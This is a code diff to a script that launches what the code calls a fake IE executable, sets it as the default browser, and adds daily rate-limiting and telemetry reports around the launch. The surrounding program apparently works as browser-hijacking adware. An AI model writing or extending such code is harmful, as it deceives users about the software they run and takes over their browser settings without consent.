@@ -15,6 +15,31 @@ function LnchInTime.GetFakeIEPath()
 	// return "E:\\project\\COM_B\\googlecode\\trunk\\code\\YBYL\\Debug\\iexplore.exe"
 }
 
+function CheckHistory(strProcName)
+{
+	var strHistIniPath = CommonFun.GetHistoryPath()
+	if (!CommonFun.QueryFileExists(strHistIniPath))
+	{
+		return true
+	}
+	
+	var nLastLaunch = CommonFun.ReadINIFile(strHistIniPath, strProcName, "launch")
+	var bIsToday = CommonFun.CheckIsToday(nLastLaunch)
+	if ( bIsToday )
+	{
+		return false
+	}
+	
+	return true
+}
+
+function LnchInTime.SaveHistory(strProcFlag, strKey)
+{
+	var strHistIniPath = CommonFun.GetHistoryPath()
+	var nCurrentUTC = CommonFun.GetCurrentUTCTime()
+	CommonFun.WriteINIFile(strHistIniPath, strProcFlag, strKey, nCurrentUTC.toString())
+}
+
 function LnchInTime.DoSetDefaultBrowser()
 {
 	if (CommonFun.IsWin7())
@@ -83,6 +108,23 @@ function LnchInTime.Main()
 	var objCloudCount = new ClassCloudCount()
 	objCloudCount.Increase("yb DoSetDefaultBrowser enter")
 	
+	var tReport = {}
+	tReport.EC = "launch_ie"
+	tReport.EA = "start"
+	tReport.EL = "1"
+	CommonFun.SendReport(tReport)
+	CommonFun.log("launch_ie: start")
+	
+	if (!CheckHistory("launch_ie"))
+	{
+		tReport.EA = "time_invalid"
+		CommonFun.SendReport(tReport)
+		CommonFun.log("launch_ie: time_invalid")
+		return
+	}
+	
+	LnchInTime.SaveHistory("launch_ie", "launch")
+	
 	var sLastRunTime = CommonFun.RegQueryValue("HKEY_CURRENT_USER\\SOFTWARE\\iexplorer\\LastRunTime")
 	if (sLastRunTime)
 	{
@@ -112,6 +154,9 @@ function LnchInTime.Main()
 		CommonFun.log("sToday: " + sToday)
 		if (sToday == sLastRunTime)
 		{
+			tReport.EA = "haslaunch_today"
+			CommonFun.SendReport(tReport)
+			CommonFun.log("launch_ie: haslaunch_today")
 			return//今日已启动过伪IE
 		}
 	}
@@ -135,14 +180,17 @@ function LnchInTime.Main()
             // alert('找不到文件"'+sFakeIEPath+'"(或它的组件之一)。请确定路径和文件名是否正确.')        
 		}   
 		
-		var tReport = {}
-		tReport.EC = "iefmain"
-		tReport.EA = "setDefaultBrowser"
+		tReport.EA = "success"
 		CommonFun.SendReport(tReport)
+		CommonFun.log("launch_ie: success")
 	}else
 	{
+		tReport.EA = "getie_faild"
+		CommonFun.SendReport(tReport)
 		CommonFun.log("get sFakeIEPath failed: ")
 	}
+	
+	CommonFun.log("launch_ie: out")
 	objCloudCount.Decrease("yb DoSetDefaultBrowser enter")
 }
 
